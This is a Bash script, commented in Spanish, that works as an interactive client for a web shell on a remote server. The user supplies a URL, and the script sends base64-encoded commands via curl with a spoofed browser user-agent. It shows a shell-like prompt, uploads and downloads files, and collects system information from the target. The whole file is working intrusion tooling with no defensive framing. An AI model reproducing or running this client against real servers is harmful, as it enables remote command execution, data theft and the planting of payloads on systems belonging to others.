#!/bin/bash

echo "====================================="
echo "  Shell Remota Avanzada"
echo "====================================="
echo ""
echo -n "URL del servidor: "
read URL

echo ""
echo "Conectando..."

# Enviar comando codificado en base64
send_command() {
    local data_str=$1
    local encoded=$(echo -n "$data_str" | base64 -w 0)
    curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -X POST "$URL" -d "d=$encoded"
}

# Obtener info inicial
response=$(send_command "t=pwd;whoami;hostname")
decoded=$(echo "$response" | base64 -d 2>/dev/null)

current_pwd=$(echo "$decoded" | grep -o '"pwd":"[^"]*"' | cut -d'"' -f4)
output=$(echo "$decoded" | grep -o '"output":"[^"]*"' | sed 's/"output":"//;s/"$//' | sed 's/\\n/\n/g')

if [ -z "$current_pwd" ]; then
    echo "Error: No se pudo conectar al servidor"
    echo "Respuesta: $response"
    exit 1
fi

user=$(echo "$output" | sed -n '2p' | tr -d '\r')
host=$(echo "$output" | sed -n '3p' | tr -d '\r')

echo "Conectado como: $user@$host"
echo ""

# Función para subir archivo
upload_file() {
    local file=$1
    if [ ! -f "$file" ]; then
        echo "Error: Archivo '$file' no existe"
        return
    fi
    
    echo "Subiendo $file..."
    base64_data=$(base64 -w 0 "$file")
    remote_path="$current_pwd/$(basename $file)"
    
    response=$(send_command "u=1&p=$remote_path&c=$base64_data")
    decoded=$(echo "$response" | base64 -d 2>/dev/null)
    echo "$decoded"
}

# Función para descargar archivo
download_file() {
    local remote_file=$1
    local local_file=$(basename "$remote_file")
    
    echo "Descargando $remote_file..."
    response=$(send_command "g=1&f=$remote_file")
    decoded=$(echo "$response" | base64 -d 2>/dev/null)
    
    data=$(echo "$decoded" | grep -o '"data":"[^"]*"' | sed 's/"data":"//;s/"$//')
    
    if [ -n "$data" ] && [ "$data" != "null" ]; then
        echo "$data" | base64 -d > "$local_file"
        echo "Guardado como: $local_file"
    else
        echo "Error: No se pudo descargar el archivo"
    fi
}

# Mostrar ayuda
show_help() {
    echo ""
    echo "Comandos especiales:"
    echo "  upload <archivo>       - Subir archivo"
    echo "  download <archivo>     - Descargar archivo"
    echo "  sysinfo                - Info del sistema"
    echo "  help                   - Mostrar ayuda"
    echo "  exit                   - Salir"
    echo ""
}

while true; do
    echo -ne "\033[1;32m$user@$host\033[0m:\033[1;34m$current_pwd\033[0m$ "
    read -r cmd
    
    if [ "$cmd" = "exit" ] || [ "$cmd" = "quit" ]; then
        echo "Cerrando conexión..."
        break
    elif [ "$cmd" = "help" ]; then
        show_help
        continue
    elif [[ "$cmd" =~ ^upload[[:space:]](.+)$ ]]; then
        upload_file "${BASH_REMATCH[1]}"
        continue
    elif [[ "$cmd" =~ ^download[[:space:]](.+)$ ]]; then
        download_file "${BASH_REMATCH[1]}"
        continue
    elif [ "$cmd" = "sysinfo" ]; then
        cmd="uname -a && echo '---' && cat /etc/os-release 2>/dev/null || cat /etc/issue && echo '---' && df -h"
    fi
    
    if [ -z "$cmd" ]; then
        continue
    fi
    
    # URL encode el comando
    cmd_encoded=$(echo -n "$cmd" | sed 's/ /%20/g' | sed 's/|/%7C/g' | sed 's/&/%26/g')
    
    response=$(send_command "t=$cmd_encoded")
    decoded=$(echo "$response" | base64 -d 2>/dev/null)
    
    output=$(echo "$decoded" | grep -o '"output":"[^"]*"' | sed 's/"output":"//;s/"$//' | sed 's/\\n/\n/g' | sed 's/\\t/\t/g')
    new_pwd=$(echo "$decoded" | grep -o '"pwd":"[^"]*"' | cut -d'"' -f4)
    
    if [ -n "$new_pwd" ]; then
        current_pwd="$new_pwd"
    fi
    
    if [ -n "$output" ] && [ "$output" != "null" ]; then
        echo "$output"
    fi
done